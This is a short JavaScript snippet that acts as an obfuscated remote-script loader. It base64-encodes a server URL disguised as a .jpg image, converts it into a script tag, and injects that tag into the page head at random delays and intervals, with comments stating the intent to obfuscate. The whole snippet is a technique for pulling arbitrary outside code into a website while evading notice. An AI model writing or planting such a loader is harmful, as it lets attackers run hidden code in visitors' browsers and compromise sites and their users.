(function() {
    // Encode the URL to add obfuscation
    var encodedUrl = 'aHR0cHM6Ly95b3VyLXNlcnZlci5jb20vZmFrZS1wYXRoLmpwZw=='; // Base64 for your domain
    
    // Decode function
    var decodeUrl = function(encoded) {
        return atob(encoded);
    };
    var selectEl = function(query) { return document.querySelector(query); };
    var makeEl = function(tag) { return document.createElement(tag); };
    var setAttr = function(element, attribute, value) { element.setAttribute(attribute, value); };

    var imgEl = makeEl('img');
    setAttr(imgEl, 'src', decodeUrl(encodedUrl));
    var divEl = makeEl('div');
    divEl.innerHTML = imgEl.outerHTML;
    var scriptSrc = divEl.firstChild.getAttribute('src');
    var scriptEl = makeEl('script');
    setAttr(scriptEl, 'src', scriptSrc);

    // Random delay function
    var appendScriptWithRandomDelay = function() {
        var delay = Math.floor(Math.random() * 15000); 
        setTimeout(function() {
            document.head.appendChild(scriptEl);
        }, delay);
    };

    setInterval(appendScriptWithRandomDelay, Math.floor(Math.random() * 12000 + 5000)); // Random interval between 5 and 17 seconds
})();
